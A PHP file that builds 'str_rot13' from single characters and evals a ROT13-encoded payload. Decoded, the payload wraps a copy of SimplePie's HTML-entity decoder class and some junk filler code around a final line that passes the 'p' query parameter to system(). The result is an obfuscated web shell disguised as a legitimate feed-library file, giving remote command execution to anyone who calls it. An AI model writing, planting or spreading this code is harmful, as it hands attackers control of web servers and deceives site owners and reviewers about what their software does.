<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * FvzcyrCvr
 *
 * N CUC-Onfrq EFF naq Ngbz Srrq Senzrjbex.
 * Gnxrf gur uneq jbex bhg bs znantvat n pbzcyrgr EFF/Ngbz fbyhgvba.
 *
 * Pbclevtug (p) 2004-2022, Elna Cnezna, Fnz Farqqba, Elna ZpPhr, naq pbagevohgbef
 * Nyy evtugf erfreirq.
 *
 * Erqvfgevohgvba naq hfr va fbhepr naq ovanel sbezf, jvgu be jvgubhg zbqvsvpngvba, ner
 * crezvggrq cebivqrq gung gur sbyybjvat pbaqvgvbaf ner zrg:
 *
 * 	* Erqvfgevohgvbaf bs fbhepr pbqr zhfg ergnva gur nobir pbclevtug abgvpr, guvf yvfg bs
 * 	  pbaqvgvbaf naq gur sbyybjvat qvfpynvzre.
 *
 * 	* Erqvfgevohgvbaf va ovanel sbez zhfg ercebqhpr gur nobir pbclevtug abgvpr, guvf yvfg
 * 	  bs pbaqvgvbaf naq gur sbyybjvat qvfpynvzre va gur qbphzragngvba naq/be bgure zngrevnyf
 * 	  cebivqrq jvgu gur qvfgevohgvba.
 *
 * 	* Arvgure gur anzr bs gur FvzcyrCvr Grnz abe gur anzrf bs vgf pbagevohgbef znl or hfrq
 * 	  gb raqbefr be cebzbgr cebqhpgf qrevirq sebz guvf fbsgjner jvgubhg fcrpvsvp cevbe
 * 	  jevggra crezvffvba.
 *
 * GUVF FBSGJNER VF CEBIVQRQ OL GUR PBCLEVTUG UBYQREF NAQ PBAGEVOHGBEF \"NF VF\" NAQ NAL RKCERFF
 * BE VZCYVRQ JNEENAGVRF, VAPYHQVAT, OHG ABG YVZVGRQ GB, GUR VZCYVRQ JNEENAGVRF BS ZREPUNAGNOVYVGL
 * NAQ SVGARFF SBE N CNEGVPHYNE CHECBFR NER QVFPYNVZRQ. VA AB RIRAG FUNYY GUR PBCLEVTUG UBYQREF
 * NAQ PBAGEVOHGBEF OR YVNOYR SBE NAL QVERPG, VAQVERPG, VAPVQRAGNY, FCRPVNY, RKRZCYNEL, BE
 * PBAFRDHRAGVNY QNZNTRF (VAPYHQVAT, OHG ABG YVZVGRQ GB, CEBPHERZRAG BS FHOFGVGHGR TBBQF BE
 * FREIVPRF; YBFF BS HFR, QNGN, BE CEBSVGF; BE OHFVARFF VAGREEHCGVBA) UBJRIRE PNHFRQ NAQ BA NAL
 * GURBEL BS YVNOVYVGL, JURGURE VA PBAGENPG, FGEVPG YVNOVYVGL, BE GBEG (VAPYHQVAT ARTYVTRAPR BE
 * BGUREJVFR) NEVFVAT VA NAL JNL BHG BS GUR HFR BS GUVF FBSGJNER, RIRA VS NQIVFRQ BS GUR
 * CBFFVOVYVGL BS FHPU QNZNTR.
 *
 * @cnpxntr FvzcyrCvr
 * @pbclevtug 2004-2016 Elna Cnezna, Fnz Farqqba, Elna ZpPhr
 * @nhgube Elna Cnezna
 * @nhgube Fnz Farqqba
 * @nhgube Elna ZpPhr
 * @yvax uggc://fvzcyrcvr.bet/ FvzcyrCvr
 * @yvprafr uggc://jjj.bcrafbhepr.bet/yvprafrf/ofq-yvprafr.cuc OFQ Yvprafr
 */


/**
 * Qrpbqr UGZY Ragvgvrf
 *
 * Guvf vzcyrzragf UGZY5 nf bs erivfvba 967 (2007-06-28)
 *
 * @qrcerpngrq Hfr QBZQbphzrag vafgrnq!
 * @cnpxntr FvzcyrCvr
 */
pynff FvzcyrCvr_Qrpbqr_UGZY_Ragvgvrf
{
    /**
     * Qngn gb or cnefrq
     *
     * @npprff cevingr
     * @ine fgevat
     */
    choyvp $qngn = '';

    /**
     * Pheeragyl pbafhzrq olgrf
     *
     * @npprff cevingr
     * @ine fgevat
     */
    choyvp $pbafhzrq = '';

    /**
     * Cbfvgvba bs gur pheerag olgr orvat cnefrq
     *
     * @npprff cevingr
     * @ine vag
     */
    choyvp $cbfvgvba = 0;

    /**
     * Perngr na vafgnapr bs gur pynff jvgu gur vachg qngn
     *
     * @npprff choyvp
     * @cnenz fgevat $qngn Vachg qngn
     */
    choyvp shapgvba __pbafgehpg($qngn)
    {
        $guvf->qngn = $qngn;
    }

    /**
     * Cnefr gur vachg qngn
     *
     * @npprff choyvp
     * @erghea fgevat Bhgchg qngn
     */
    choyvp shapgvba cnefr()
    {
        juvyr (($guvf->cbfvgvba = fgecbf($guvf->qngn, '&', $guvf->cbfvgvba)) !== snyfr) {
            $guvf->pbafhzr();
            $guvf->ragvgl();
            $guvf->pbafhzrq = '';
        }
        erghea $guvf->qngn;
    }

    /**
     * Pbafhzr gur arkg olgr
     *
     * @npprff cevingr
     * @erghea zvkrq Gur arkg olgr, be snyfr, vs gurer vf ab zber qngn
     */
    choyvp shapgvba pbafhzr()
    {
        vs (vffrg($guvf->qngn[$guvf->cbfvgvba])) {
            $guvf->pbafhzrq .= $guvf->qngn[$guvf->cbfvgvba];
            erghea $guvf->qngn[$guvf->cbfvgvba++];
        }

        erghea snyfr;
    }

    /**
     * Pbafhzr n enatr bs punenpgref
     *
     * @npprff cevingr
     * @cnenz fgevat $punef Punenpgref gb pbafhzr
     * @erghea zvkrq N frevrf bs punenpgref gung zngpu gur enatr, be snyfr
     */
    choyvp shapgvba pbafhzr_enatr($punef)
    {
        vs ($yra = fgefca($guvf->qngn, $punef, $guvf->cbfvgvba)) {
            $qngn = fhofge($guvf->qngn, $guvf->cbfvgvba, $yra);
            $guvf->pbafhzrq .= $qngn;
            $guvf->cbfvgvba += $yra;
            erghea $qngn;
        }

        erghea snyfr;
    }

    /**
     * Hapbafhzr bar olgr
     *
     * @npprff cevingr
     */
    choyvp shapgvba hapbafhzr()
    {
        $guvf->pbafhzrq = fhofge($guvf->pbafhzrq, 0, -1);
        $guvf->cbfvgvba--;
    }

    /**
     * Qrpbqr na ragvgl
     *
     * @npprff cevingr
     */
    choyvp shapgvba ragvgl()
    {
        fjvgpu ($guvf->pbafhzr()) {
            pnfr \"\k09\":
            pnfr \"\k0N\":
            pnfr \"\k0O\":
            pnfr \"\k0P\":
            pnfr \"\k20\":
            pnfr \"\k3P\":
            pnfr \"\k26\":
            pnfr snyfr:
                oernx;

            pnfr \"\k23\":
                fjvgpu ($guvf->pbafhzr()) {
                    pnfr \"\k78\":
                    pnfr \"\k58\":
                        $enatr = '0123456789NOPQRSnopqrs';
                        $urk = gehr;
                        oernx;

                    qrsnhyg:
                        $enatr = '0123456789';
                        $urk = snyfr;
                        $guvf->hapbafhzr();
                        oernx;
                }

                vs ($pbqrcbvag = $guvf->pbafhzr_enatr($enatr)) {
                    fgngvp $jvaqbjf_1252_fcrpvnyf = [0k0Q => \"\k0N\", 0k80 => \"\kR2\k82\kNP\", 0k81 => \"\kRS\kOS\kOQ\", 0k82 => \"\kR2\k80\k9N\", 0k83 => \"\kP6\k92\", 0k84 => \"\kR2\k80\k9R\", 0k85 => \"\kR2\k80\kN6\", 0k86 => \"\kR2\k80\kN0\", 0k87 => \"\kR2\k80\kN1\", 0k88 => \"\kPO\k86\", 0k89 => \"\kR2\k80\kO0\", 0k8N => \"\kP5\kN0\", 0k8O => \"\kR2\k80\kO9\", 0k8P => \"\kP5\k92\", 0k8Q => \"\kRS\kOS\kOQ\", 0k8R => \"\kP5\kOQ\", 0k8S => \"\kRS\kOS\kOQ\", 0k90 => \"\kRS\kOS\kOQ\", 0k91 => \"\kR2\k80\k98\", 0k92 => \"\kR2\k80\k99\", 0k93 => \"\kR2\k80\k9P\", 0k94 => \"\kR2\k80\k9Q\", 0k95 => \"\kR2\k80\kN2\", 0k96 => \"\kR2\k80\k93\", 0k97 => \"\kR2\k80\k94\", 0k98 => \"\kPO\k9P\", 0k99 => \"\kR2\k84\kN2\", 0k9N => \"\kP5\kN1\", 0k9O => \"\kR2\k80\kON\", 0k9P => \"\kP5\k93\", 0k9Q => \"\kRS\kOS\kOQ\", 0k9R => \"\kP5\kOR\", 0k9S => \"\kP5\kO8\"];

                    vs ($urk) {
                        $pbqrcbvag = urkqrp($pbqrcbvag);
                    } ryfr {
                        $pbqrcbvag = vaginy($pbqrcbvag);
                    }

                    vs (vffrg($jvaqbjf_1252_fcrpvnyf[$pbqrcbvag])) {
                        $ercynprzrag = $jvaqbjf_1252_fcrpvnyf[$pbqrcbvag];
                    } ryfr {
                        $ercynprzrag = FvzcyrCvr_Zvfp::pbqrcbvag_gb_hgs8($pbqrcbvag);
                    }

                    vs (!va_neenl($guvf->pbafhzr(), [';', snyfr], gehr)) {
                        $guvf->hapbafhzr();
                    }

                    $pbafhzrq_yratgu = fgeyra($guvf->pbafhzrq);
                    $guvf->qngn = fhofge_ercynpr($guvf->qngn, $ercynprzrag, $guvf->cbfvgvba - $pbafhzrq_yratgu, $pbafhzrq_yratgu);
                    $guvf->cbfvgvba += fgeyra($ercynprzrag) - $pbafhzrq_yratgu;
                }
                oernx;

            qrsnhyg:
                fgngvp $ragvgvrf = [
                    'Nnphgr' => \"\kP3\k81\",
                    'nnphgr' => \"\kP3\kN1\",
                    'Nnphgr;' => \"\kP3\k81\",
                    'nnphgr;' => \"\kP3\kN1\",
                    'Npvep' => \"\kP3\k82\",
                    'npvep' => \"\kP3\kN2\",
                    'Npvep;' => \"\kP3\k82\",
                    'npvep;' => \"\kP3\kN2\",
                    'nphgr' => \"\kP2\kO4\",
                    'nphgr;' => \"\kP2\kO4\",
                    'NRyvt' => \"\kP3\k86\",
                    'nryvt' => \"\kP3\kN6\",
                    'NRyvt;' => \"\kP3\k86\",
                    'nryvt;' => \"\kP3\kN6\",
                    'Ntenir' => \"\kP3\k80\",
                    'ntenir' => \"\kP3\kN0\",
                    'Ntenir;' => \"\kP3\k80\",
                    'ntenir;' => \"\kP3\kN0\",
                    'nyrsflz;' => \"\kR2\k84\kO5\",
                    'Nycun;' => \"\kPR\k91\",
                    'nycun;' => \"\kPR\kO1\",
                    'NZC' => \"\k26\",
                    'nzc' => \"\k26\",
                    'NZC;' => \"\k26\",
                    'nzc;' => \"\k26\",
                    'naq;' => \"\kR2\k88\kN7\",
                    'nat;' => \"\kR2\k88\kN0\",
                    'ncbf;' => \"\k27\",
                    'Nevat' => \"\kP3\k85\",
                    'nevat' => \"\kP3\kN5\",
                    'Nevat;' => \"\kP3\k85\",
                    'nevat;' => \"\kP3\kN5\",
                    'nflzc;' => \"\kR2\k89\k88\",
                    'Ngvyqr' => \"\kP3\k83\",
                    'ngvyqr' => \"\kP3\kN3\",
                    'Ngvyqr;' => \"\kP3\k83\",
                    'ngvyqr;' => \"\kP3\kN3\",
                    'Nhzy' => \"\kP3\k84\",
                    'nhzy' => \"\kP3\kN4\",
                    'Nhzy;' => \"\kP3\k84\",
                    'nhzy;' => \"\kP3\kN4\",
                    'oqdhb;' => \"\kR2\k80\k9R\",
                    'Orgn;' => \"\kPR\k92\",
                    'orgn;' => \"\kPR\kO2\",
                    'oeione' => \"\kP2\kN6\",
                    'oeione;' => \"\kP2\kN6\",
                    'ohyy;' => \"\kR2\k80\kN2\",
                    'pnc;' => \"\kR2\k88\kN9\",
                    'Pprqvy' => \"\kP3\k87\",
                    'pprqvy' => \"\kP3\kN7\",
                    'Pprqvy;' => \"\kP3\k87\",
                    'pprqvy;' => \"\kP3\kN7\",
                    'prqvy' => \"\kP2\kO8\",
                    'prqvy;' => \"\kP2\kO8\",
                    'prag' => \"\kP2\kN2\",
                    'prag;' => \"\kP2\kN2\",
                    'Puv;' => \"\kPR\kN7\",
                    'puv;' => \"\kPS\k87\",
                    'pvep;' => \"\kPO\k86\",
                    'pyhof;' => \"\kR2\k99\kN3\",
                    'pbat;' => \"\kR2\k89\k85\",
                    'PBCL' => \"\kP2\kN9\",
                    'pbcl' => \"\kP2\kN9\",
                    'PBCL;' => \"\kP2\kN9\",
                    'pbcl;' => \"\kP2\kN9\",
                    'penee;' => \"\kR2\k86\kO5\",
                    'phc;' => \"\kR2\k88\kNN\",
                    'pheera' => \"\kP2\kN4\",
                    'pheera;' => \"\kP2\kN4\",
                    'Qnttre;' => \"\kR2\k80\kN1\",
                    'qnttre;' => \"\kR2\k80\kN0\",
                    'qNee;' => \"\kR2\k87\k93\",
                    'qnee;' => \"\kR2\k86\k93\",
                    'qrt' => \"\kP2\kO0\",
                    'qrt;' => \"\kP2\kO0\",
                    'Qrygn;' => \"\kPR\k94\",
                    'qrygn;' => \"\kPR\kO4\",
                    'qvnzf;' => \"\kR2\k99\kN6\",
                    'qvivqr' => \"\kP3\kO7\",
                    'qvivqr;' => \"\kP3\kO7\",
                    'Rnphgr' => \"\kP3\k89\",
                    'rnphgr' => \"\kP3\kN9\",
                    'Rnphgr;' => \"\kP3\k89\",
                    'rnphgr;' => \"\kP3\kN9\",
                    'Rpvep' => \"\kP3\k8N\",
                    'rpvep' => \"\kP3\kNN\",
                    'Rpvep;' => \"\kP3\k8N\",
                    'rpvep;' => \"\kP3\kNN\",
                    'Rtenir' => \"\kP3\k88\",
                    'rtenir' => \"\kP3\kN8\",
                    'Rtenir;' => \"\kP3\k88\",
                    'rtenir;' => \"\kP3\kN8\",
                    'rzcgl;' => \"\kR2\k88\k85\",
                    'rzfc;' => \"\kR2\k80\k83\",
                    'rafc;' => \"\kR2\k80\k82\",
                    'Rcfvyba;' => \"\kPR\k95\",
                    'rcfvyba;' => \"\kPR\kO5\",
                    'rdhvi;' => \"\kR2\k89\kN1\",
                    'Rgn;' => \"\kPR\k97\",
                    'rgn;' => \"\kPR\kO7\",
                    'RGU' => \"\kP3\k90\",
                    'rgu' => \"\kP3\kO0\",
                    'RGU;' => \"\kP3\k90\",
                    'rgu;' => \"\kP3\kO0\",
                    'Rhzy' => \"\kP3\k8O\",
                    'rhzy' => \"\kP3\kNO\",
                    'Rhzy;' => \"\kP3\k8O\",
                    'rhzy;' => \"\kP3\kNO\",
                    'rheb;' => \"\kR2\k82\kNP\",
                    'rkvfg;' => \"\kR2\k88\k83\",
                    'sabs;' => \"\kP6\k92\",
                    'sbenyy;' => \"\kR2\k88\k80\",
                    'senp12' => \"\kP2\kOQ\",
                    'senp12;' => \"\kP2\kOQ\",
                    'senp14' => \"\kP2\kOP\",
                    'senp14;' => \"\kP2\kOP\",
                    'senp34' => \"\kP2\kOR\",
                    'senp34;' => \"\kP2\kOR\",
                    'senfy;' => \"\kR2\k81\k84\",
                    'Tnzzn;' => \"\kPR\k93\",
                    'tnzzn;' => \"\kPR\kO3\",
                    'tr;' => \"\kR2\k89\kN5\",
                    'TG' => \"\k3R\",
                    'tg' => \"\k3R\",
                    'TG;' => \"\k3R\",
                    'tg;' => \"\k3R\",
                    'uNee;' => \"\kR2\k87\k94\",
                    'unee;' => \"\kR2\k86\k94\",
                    'urnegf;' => \"\kR2\k99\kN5\",
                    'uryyvc;' => \"\kR2\k80\kN6\",
                    'Vnphgr' => \"\kP3\k8Q\",
                    'vnphgr' => \"\kP3\kNQ\",
                    'Vnphgr;' => \"\kP3\k8Q\",
                    'vnphgr;' => \"\kP3\kNQ\",
                    'Vpvep' => \"\kP3\k8R\",
                    'vpvep' => \"\kP3\kNR\",
                    'Vpvep;' => \"\kP3\k8R\",
                    'vpvep;' => \"\kP3\kNR\",
                    'vrkpy' => \"\kP2\kN1\",
                    'vrkpy;' => \"\kP2\kN1\",
                    'Vtenir' => \"\kP3\k8P\",
                    'vtenir' => \"\kP3\kNP\",
                    'Vtenir;' => \"\kP3\k8P\",
                    'vtenir;' => \"\kP3\kNP\",
                    'vzntr;' => \"\kR2\k84\k91\",
                    'vasva;' => \"\kR2\k88\k9R\",
                    'vag;' => \"\kR2\k88\kNO\",
                    'Vbgn;' => \"\kPR\k99\",
                    'vbgn;' => \"\kPR\kO9\",
                    'vdhrfg' => \"\kP2\kOS\",
                    'vdhrfg;' => \"\kP2\kOS\",
                    'vfva;' => \"\kR2\k88\k88\",
                    'Vhzy' => \"\kP3\k8S\",
                    'vhzy' => \"\kP3\kNS\",
                    'Vhzy;' => \"\kP3\k8S\",
                    'vhzy;' => \"\kP3\kNS\",
                    'Xnccn;' => \"\kPR\k9N\",
                    'xnccn;' => \"\kPR\kON\",
                    'Ynzoqn;' => \"\kPR\k9O\",
                    'ynzoqn;' => \"\kPR\kOO\",
                    'ynat;' => \"\kR3\k80\k88\",
                    'yndhb' => \"\kP2\kNO\",
                    'yndhb;' => \"\kP2\kNO\",
                    'yNee;' => \"\kR2\k87\k90\",
                    'ynee;' => \"\kR2\k86\k90\",
                    'yprvy;' => \"\kR2\k8P\k88\",
                    'yqdhb;' => \"\kR2\k80\k9P\",
                    'yr;' => \"\kR2\k89\kN4\",
                    'ysybbe;' => \"\kR2\k8P\k8N\",
                    'ybjnfg;' => \"\kR2\k88\k97\",
                    'ybm;' => \"\kR2\k97\k8N\",
                    'yez;' => \"\kR2\k80\k8R\",
                    'yfndhb;' => \"\kR2\k80\kO9\",
                    'yfdhb;' => \"\kR2\k80\k98\",
                    'YG' => \"\k3P\",
                    'yg' => \"\k3P\",
                    'YG;' => \"\k3P\",
                    'yg;' => \"\k3P\",
                    'znpe' => \"\kP2\kNS\",
                    'znpe;' => \"\kP2\kNS\",
                    'zqnfu;' => \"\kR2\k80\k94\",
                    'zvpeb' => \"\kP2\kO5\",
                    'zvpeb;' => \"\kP2\kO5\",
                    'zvqqbg' => \"\kP2\kO7\",
                    'zvqqbg;' => \"\kP2\kO7\",
                    'zvahf;' => \"\kR2\k88\k92\",
                    'Zh;' => \"\kPR\k9P\",
                    'zh;' => \"\kPR\kOP\",
                    'anoyn;' => \"\kR2\k88\k87\",
                    'aofc' => \"\kP2\kN0\",
                    'aofc;' => \"\kP2\kN0\",
                    'aqnfu;' => \"\kR2\k80\k93\",
                    'ar;' => \"\kR2\k89\kN0\",
                    'av;' => \"\kR2\k88\k8O\",
                    'abg' => \"\kP2\kNP\",
                    'abg;' => \"\kP2\kNP\",
                    'abgva;' => \"\kR2\k88\k89\",
                    'afho;' => \"\kR2\k8N\k84\",
                    'Agvyqr' => \"\kP3\k91\",
                    'agvyqr' => \"\kP3\kO1\",
                    'Agvyqr;' => \"\kP3\k91\",
                    'agvyqr;' => \"\kP3\kO1\",
                    'Ah;' => \"\kPR\k9Q\",
                    'ah;' => \"\kPR\kOQ\",
                    'Bnphgr' => \"\kP3\k93\",
                    'bnphgr' => \"\kP3\kO3\",
                    'Bnphgr;' => \"\kP3\k93\",
                    'bnphgr;' => \"\kP3\kO3\",
                    'Bpvep' => \"\kP3\k94\",
                    'bpvep' => \"\kP3\kO4\",
                    'Bpvep;' => \"\kP3\k94\",
                    'bpvep;' => \"\kP3\kO4\",
                    'BRyvt;' => \"\kP5\k92\",
                    'bryvt;' => \"\kP5\k93\",
                    'Btenir' => \"\kP3\k92\",
                    'btenir' => \"\kP3\kO2\",
                    'Btenir;' => \"\kP3\k92\",
                    'btenir;' => \"\kP3\kO2\",
                    'byvar;' => \"\kR2\k80\kOR\",
                    'Bzrtn;' => \"\kPR\kN9\",
                    'bzrtn;' => \"\kPS\k89\",
                    'Bzvpeba;' => \"\kPR\k9S\",
                    'bzvpeba;' => \"\kPR\kOS\",
                    'bcyhf;' => \"\kR2\k8N\k95\",
                    'be;' => \"\kR2\k88\kN8\",
                    'beqs' => \"\kP2\kNN\",
                    'beqs;' => \"\kP2\kNN\",
                    'beqz' => \"\kP2\kON\",
                    'beqz;' => \"\kP2\kON\",
                    'Bfynfu' => \"\kP3\k98\",
                    'bfynfu' => \"\kP3\kO8\",
                    'Bfynfu;' => \"\kP3\k98\",
                    'bfynfu;' => \"\kP3\kO8\",
                    'Bgvyqr' => \"\kP3\k95\",
                    'bgvyqr' => \"\kP3\kO5\",
                    'Bgvyqr;' => \"\kP3\k95\",
                    'bgvyqr;' => \"\kP3\kO5\",
                    'bgvzrf;' => \"\kR2\k8N\k97\",
                    'Bhzy' => \"\kP3\k96\",
                    'bhzy' => \"\kP3\kO6\",
                    'Bhzy;' => \"\kP3\k96\",
                    'bhzy;' => \"\kP3\kO6\",
                    'cnen' => \"\kP2\kO6\",
                    'cnen;' => \"\kP2\kO6\",
                    'cneg;' => \"\kR2\k88\k82\",
                    'crezvy;' => \"\kR2\k80\kO0\",
                    'crec;' => \"\kR2\k8N\kN5\",
                    'Cuv;' => \"\kPR\kN6\",
                    'cuv;' => \"\kPS\k86\",
                    'Cv;' => \"\kPR\kN0\",
                    'cv;' => \"\kPS\k80\",
                    'cvi;' => \"\kPS\k96\",
                    'cyhfza' => \"\kP2\kO1\",
                    'cyhfza;' => \"\kP2\kO1\",
                    'cbhaq' => \"\kP2\kN3\",
                    'cbhaq;' => \"\kP2\kN3\",
                    'Cevzr;' => \"\kR2\k80\kO3\",
                    'cevzr;' => \"\kR2\k80\kO2\",
                    'cebq;' => \"\kR2\k88\k8S\",
                    'cebc;' => \"\kR2\k88\k9Q\",
                    'Cfv;' => \"\kPR\kN8\",
                    'cfv;' => \"\kPS\k88\",
                    'DHBG' => \"\k22\",
                    'dhbg' => \"\k22\",
                    'DHBG;' => \"\k22\",
                    'dhbg;' => \"\k22\",
                    'enqvp;' => \"\kR2\k88\k9N\",
                    'enat;' => \"\kR3\k80\k89\",
                    'endhb' => \"\kP2\kOO\",
                    'endhb;' => \"\kP2\kOO\",
                    'eNee;' => \"\kR2\k87\k92\",
                    'enee;' => \"\kR2\k86\k92\",
                    'eprvy;' => \"\kR2\k8P\k89\",
                    'eqdhb;' => \"\kR2\k80\k9Q\",
                    'erny;' => \"\kR2\k84\k9P\",
                    'ERT' => \"\kP2\kNR\",
                    'ert' => \"\kP2\kNR\",
                    'ERT;' => \"\kP2\kNR\",
                    'ert;' => \"\kP2\kNR\",
                    'esybbe;' => \"\kR2\k8P\k8O\",
                    'Eub;' => \"\kPR\kN1\",
                    'eub;' => \"\kPS\k81\",
                    'eyz;' => \"\kR2\k80\k8S\",
                    'efndhb;' => \"\kR2\k80\kON\",
                    'efdhb;' => \"\kR2\k80\k99\",
                    'fodhb;' => \"\kR2\k80\k9N\",
                    'Fpneba;' => \"\kP5\kN0\",
                    'fpneba;' => \"\kP5\kN1\",
                    'fqbg;' => \"\kR2\k8O\k85\",
                    'frpg' => \"\kP2\kN7\",
                    'frpg;' => \"\kP2\kN7\",
                    'ful' => \"\kP2\kNQ\",
                    'ful;' => \"\kP2\kNQ\",
                    'Fvtzn;' => \"\kPR\kN3\",
                    'fvtzn;' => \"\kPS\k83\",
                    'fvtzns;' => \"\kPS\k82\",
                    'fvz;' => \"\kR2\k88\kOP\",
                    'fcnqrf;' => \"\kR2\k99\kN0\",
                    'fho;' => \"\kR2\k8N\k82\",
                    'fhor;' => \"\kR2\k8N\k86\",
                    'fhz;' => \"\kR2\k88\k91\",
                    'fhc;' => \"\kR2\k8N\k83\",
                    'fhc1' => \"\kP2\kO9\",
                    'fhc1;' => \"\kP2\kO9\",
                    'fhc2' => \"\kP2\kO2\",
                    'fhc2;' => \"\kP2\kO2\",
                    'fhc3' => \"\kP2\kO3\",
                    'fhc3;' => \"\kP2\kO3\",
                    'fhcr;' => \"\kR2\k8N\k87\",
                    'fmyvt' => \"\kP3\k9S\",
                    'fmyvt;' => \"\kP3\k9S\",
                    'Gnh;' => \"\kPR\kN4\",
                    'gnh;' => \"\kPS\k84\",
                    'gurer4;' => \"\kR2\k88\kO4\",
                    'Gurgn;' => \"\kPR\k98\",
                    'gurgn;' => \"\kPR\kO8\",
                    'gurgnflz;' => \"\kPS\k91\",
                    'guvafc;' => \"\kR2\k80\k89\",
                    'GUBEA' => \"\kP3\k9R\",
                    'gubea' => \"\kP3\kOR\",
                    'GUBEA;' => \"\kP3\k9R\",
                    'gubea;' => \"\kP3\kOR\",
                    'gvyqr;' => \"\kPO\k9P\",
                    'gvzrf' => \"\kP3\k97\",
                    'gvzrf;' => \"\kP3\k97\",
                    'GENQR;' => \"\kR2\k84\kN2\",
                    'genqr;' => \"\kR2\k84\kN2\",
                    'Hnphgr' => \"\kP3\k9N\",
                    'hnphgr' => \"\kP3\kON\",
                    'Hnphgr;' => \"\kP3\k9N\",
                    'hnphgr;' => \"\kP3\kON\",
                    'hNee;' => \"\kR2\k87\k91\",
                    'hnee;' => \"\kR2\k86\k91\",
                    'Hpvep' => \"\kP3\k9O\",
                    'hpvep' => \"\kP3\kOO\",
                    'Hpvep;' => \"\kP3\k9O\",
                    'hpvep;' => \"\kP3\kOO\",
                    'Htenir' => \"\kP3\k99\",
                    'htenir' => \"\kP3\kO9\",
                    'Htenir;' => \"\kP3\k99\",
                    'htenir;' => \"\kP3\kO9\",
                    'hzy' => \"\kP2\kN8\",
                    'hzy;' => \"\kP2\kN8\",
                    'hcfvu;' => \"\kPS\k92\",
                    'Hcfvyba;' => \"\kPR\kN5\",
                    'hcfvyba;' => \"\kPS\k85\",
                    'Hhzy' => \"\kP3\k9P\",
                    'hhzy' => \"\kP3\kOP\",
                    'Hhzy;' => \"\kP3\k9P\",
                    'hhzy;' => \"\kP3\kOP\",
                    'jrvrec;' => \"\kR2\k84\k98\",
                    'Kv;' => \"\kPR\k9R\",
                    'kv;' => \"\kPR\kOR\",
                    'Lnphgr' => \"\kP3\k9Q\",
                    'lnphgr' => \"\kP3\kOQ\",
                    'Lnphgr;' => \"\kP3\k9Q\",
                    'lnphgr;' => \"\kP3\kOQ\",
                    'lra' => \"\kP2\kN5\",
                    'lra;' => \"\kP2\kN5\",
                    'lhzy' => \"\kP3\kOS\",
                    'Lhzy;' => \"\kP5\kO8\",
                    'lhzy;' => \"\kP3\kOS\",
                    'Mrgn;' => \"\kPR\k96\",
                    'mrgn;' => \"\kPR\kO6\",
                    'mjw;' => \"\kR2\k80\k8Q\",
                    'mjaw;' => \"\kR2\k80\k8P\"
                ];

                sbe ($v = 0, $zngpu = ahyy; $v < 9 && $guvf->pbafhzr() !== snyfr; $v++) {
                    $pbafhzrq = fhofge($guvf->pbafhzrq, 1);
                    vs (vffrg($ragvgvrf[$pbafhzrq])) {
                        $zngpu = $pbafhzrq;
                    }
                }

                vs ($zngpu !== ahyy) {
                    $guvf->qngn = fhofge_ercynpr($guvf->qngn, $ragvgvrf[$zngpu], $guvf->cbfvgvba - fgeyra($pbafhzrq) - 1, fgeyra($zngpu) + 1);
                    $guvf->cbfvgvba += fgeyra($ragvgvrf[$zngpu]) - fgeyra($pbafhzrq) - 1;
                }
                oernx;
        }
    }
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>